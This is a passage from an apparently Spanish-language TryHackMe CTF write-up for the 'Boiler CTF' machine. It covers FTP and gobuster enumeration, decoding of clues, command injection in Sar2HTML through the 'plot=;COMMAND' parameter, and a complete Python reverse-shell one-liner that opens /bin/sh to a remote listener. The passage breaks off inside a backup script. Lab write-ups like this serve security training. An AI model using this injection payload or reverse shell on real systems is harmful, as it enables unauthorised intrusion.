drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .info.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get .info.txt
local: .info.txt remote: .info.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; .info.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;802.9514 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
ftp&amp;gt; quit
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/boilerctf# cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
root@upset:~/thm/boilerctf#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje, pero no ayudo mucho.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_202900.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_202503.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/joomla &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manual &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;robots.txt&lt;/code&gt; encontramos varias direcciones &amp;ldquo;escondidas&amp;rdquo;, además de eso un mensaje &amp;ldquo;codificado&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_203434.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;http://www.unit-conversion.info/texttools/ascii/&#34;&gt;&lt;strong&gt;ASCII to text&lt;/strong&gt;&lt;/a&gt; para obtener un nueva cadena codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_205940.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_210040.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://crackstation.net/&#34;&gt;&lt;strong&gt;CrackStation&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje que no sirve de mucho.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_210101.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster---joomla&#34;&gt;GOBUSTER - JOOMLA&lt;/h2&gt;
&lt;p&gt;Pagina en Joomla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_203619.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en &lt;code&gt;/joomla&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/joomla/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/_files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/_test &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/~www &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/administrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/bin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/build &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cache &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/components &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/configuration.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/installation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/language &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/layouts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/libraries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/modules &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/plugins &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/README.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/templates &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tests &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/web.config.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;/_files&lt;/code&gt; encontramos una cadena codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211602.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena y encontramos un posible nombre de usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211632.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/_database&lt;/code&gt; encontramos una cadena cifrada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211806.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para decifrar el mensaje pero no sirvio de nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_211915.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;sar2html---rce&#34;&gt;Sar2HTML - RCE&lt;/h2&gt;
&lt;p&gt;En &lt;code&gt;/_test&lt;/code&gt; encontramos Sar2HTML al buscar una vulnerabilidad en este software encontramos que podemos ejecutar comandos en la maquina. Para ello debemos de seleccionar el Sistema Operativo (OS) y en la URL &lt;code&gt;_test/index.php?plot=;COMANDO&lt;/code&gt; colocamos nuestro comando a ejecutar y al final del dropdown en &lt;code&gt;Select Host&lt;/code&gt; encontramos el resultado de nuestro comando ejecutado. Ejecutamos id.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212500.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos &lt;code&gt;ls -lah&lt;/code&gt; y tambien logramos ver el resultado, donde vemos el archivo &lt;code&gt;log.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212549.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos cat al archivo, utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef - Strip HTML tags&lt;/strong&gt;&lt;/a&gt; para leer el html que se muestra y obtener el resultado limpio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212959.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---www-databasterd&#34;&gt;USER - WWW-DATA/BASTERD&lt;/h2&gt;
&lt;p&gt;Encontramos en el archivo un log de acceso del servicio SSH donde se muestra el usuario &lt;code&gt;basterd&lt;/code&gt; y su &amp;ldquo;contraseña&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Select HostHPUXLinuxSunOS
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:26 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: 
Server listening on 0.0.0.0 port 22.Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:26 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: 
Server listening on :: port 22.
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:35 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Accepted password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; basterd from 10.1.1.1 port &lt;span class=&#34;m&#34;&gt;49824&lt;/span&gt; ssh2 &lt;span class=&#34;c1&#34;&gt;#pass: [... REDACTED ...]&lt;/span&gt;
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:35 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: pam_unix&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sshd:session&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: session opened &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user pentest by &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Disconnected from user pentest 10.10.170.50 port &lt;span class=&#34;m&#34;&gt;49824&lt;/span&gt;
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: pam_unix&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sshd:session&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: session closed &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user pentest
Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 12:24:38 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Received signal 15&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; terminating.
Select Host FirstSelect Start Date First	
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos una shell inversa y obtenemos una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_213753.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-SHELL&#34; data-lang=&#34;SHELL&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además utilizamos la contraseña que encontramos en el servicio SSH y obtenemos una shell con el usuario &lt;code&gt;basterd&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_213932.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---stoner&#34;&gt;USER - STONER&lt;/h2&gt;
&lt;p&gt;En la carpeta principal de &lt;code&gt;basterd&lt;/code&gt; encontramos un archivo que realiza una copia a &lt;code&gt;/usr/local/backup&lt;/code&gt; y log en &lt;code&gt;/home/stoner/bck.log&lt;/code&gt; de todo lo que existe en &lt;code&gt;/home/stoner&lt;/code&gt;, además encontramos lo que parece ser una &amp;ldquo;contraseña&amp;rdquo; comentada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;REMOTE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.2.3.4
&lt;span class=&#34;nv&#34;&gt;SOURCE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/stoner
&lt;span class=&#34;nv&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/backup
&lt;span class=&#34;nv&#34;&gt;LOG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/stoner/bck.log 
&lt;span class=&#34;nv&#34;&gt;DATE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;date +%y&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;%m&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;%d&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;stoner
&lt;span class=&#34;c1&#34;&gt;#[... REDACTED ...]&lt;/span&gt;

ssh &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt; mkdir &lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ls &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
	     &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Begining copy of&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;  &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
